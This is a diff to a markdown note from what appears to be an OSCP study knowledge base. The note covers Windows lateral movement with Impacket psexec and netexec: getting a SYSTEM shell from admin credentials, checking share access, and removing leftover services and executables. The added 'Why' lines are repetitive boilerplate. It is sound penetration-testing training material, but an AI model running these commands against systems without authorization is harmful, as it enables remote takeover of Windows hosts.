@@ -6,12 +6,14 @@ Use this page when SMB access with a local administrator account is confirmed an
 
 ## Run this
 
+> **Why:** This command gathers the windows lateral movement psexec evidence needed to decide which documented route applies next.
 ```bash
 impacket-psexec $Domain/$Username:$Password@$BoxIP
 ```
 
 Or via the aliased form if Impacket is installed that way:
 
+> **Why:** This command gathers the windows lateral movement psexec evidence needed to decide which documented route applies next.
 ```bash
 psexec.py $Domain/$Username:$Password@$BoxIP
 ```
@@ -33,10 +35,11 @@ C:\Windows\system32>
 
 ## What did you get?
 
-- **Shell prompt returned:** run `whoami` immediately to confirm SYSTEM.
-- **Access denied on ADMIN$:** the account does not have write access to the admin share. Confirm the account is in the local Administrators group.
-- **Service manager error:** SMB is reachable but the account lacks service control rights. Recheck group membership.
+- **Shell prompt returned:** run `whoami` immediately; `nt authority\\system` confirms SYSTEM.
+- **Access denied on ADMIN$:** run `netexec smb $BoxIP -u $Username -p $Password --shares` and confirm the account has administrative share access.
+- **Service manager error:** run `netexec smb $BoxIP -u $Username -p $Password` and recheck group membership if service control is denied.
 
+> **Why:** This authenticated SMB or WinRM check validates the recovered credential and reveals whether the account has the requested access.
 ```bash
 netexec smb $BoxIP -u $Username -p $Password
 ```
@@ -49,6 +52,7 @@ PsExec creates three things: a service executable in ADMIN$, a Windows service e
 
 After every PsExec session, verify cleanup from outside the shell:
 
+> **Why:** This query tests the exposed directory or share interface for accounts, permissions, and readable data that determine the next route.
 ```bash
 # Check for leftover services with a PsExec-style name (four random uppercase letters)
 netexec smb $BoxIP -u $Username -p $Password -x "sc query type= all state= all | findstr /i BSOD"
@@ -60,6 +64,7 @@ smbclient //$BoxIP/ADMIN$ -U "$Domain/$Username%$Password" -c "ls *.exe"
 
 If a leftover service or executable is found:
 
+> **Why:** This query tests the exposed directory or share interface for accounts, permissions, and readable data that determine the next route.
 ```bash
 # Delete the service
 netexec smb $BoxIP -u $Username -p $Password -x "sc stop SERVICENAME & sc delete SERVICENAME"
@@ -70,8 +75,8 @@ smbclient //$BoxIP/ADMIN$ -U "$Domain/$Username%$Password" -c "del FILENAME.exe"
 
 ## What did you get?
 
-- **No .exe files listed and sc query returns no unknown services:** cleanup was automatic, nothing to do.
-- **An .exe file or unknown service is present:** remove both with the commands above and verify absence.
+- **No .exe files listed and sc query returns no unknown services:** run `dir C:\\Windows\\Temp` and `sc query` to confirm cleanup is complete.
+- **An .exe file or unknown service is present:** run the removal commands above, then run `dir C:\\Windows\\Temp` and `sc query $ServiceName` to verify absence.
 
 ## Gotcha
 
@@ -85,3 +90,14 @@ smbclient //$BoxIP/ADMIN$ -U "$Domain/$Username%$Password" -c "del FILENAME.exe"
 
 - [HackTricks PsExec](https://book.hacktricks.xyz/windows-hardening/ntlm/psexec)
 - [Impacket psexec.py source](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
+## Seen in
+- *(no write-up yet)*
+
+## Related stages
+
+- [[Windows - Service Scan]]
+- [[Windows - Web Enum]]
+- [[Windows - SMB Enum]]
+## Why this matters for OSCP
+
+This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
